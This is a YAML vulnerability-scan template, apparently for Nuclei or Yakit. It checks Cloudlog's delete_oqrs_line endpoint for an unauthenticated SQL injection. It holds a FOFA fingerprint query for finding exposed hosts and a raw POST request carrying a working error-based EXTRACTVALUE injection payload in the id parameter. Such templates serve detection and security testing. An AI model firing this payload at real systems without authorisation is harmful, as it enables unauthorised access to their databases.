content:
id: cloudlog-delete_oqrs_line-unauth-sqli

info:
  name: Cloudlog delete_oqrs_line 未授权SQL注入漏洞
  author: dreamer292 from 秃兔安全_tutusec.com
  severity: high
  description: Cloudlog系统的delete_oqrs_line接口存在未授权的SQL注入漏洞
  metadata:
    max-request: 1
    fofa-query: icon_hash="-460032467"
    verified: true
  yakit-info:
    sign: 09538d71335997c382aa8bf32ffc2566

http:
- raw:
  - |-
    @timeout: 30s
    POST /index.php/oqrs/delete_oqrs_line HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Connection: close

    id=11 AND EXTRACTVALUE(3863,CONCAT(0x5c,0x7170767171,(SELECT (ELT(3863=3863,1))),0x716b767071))

  max-redirects: 3
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - qpvqq1qkvpq
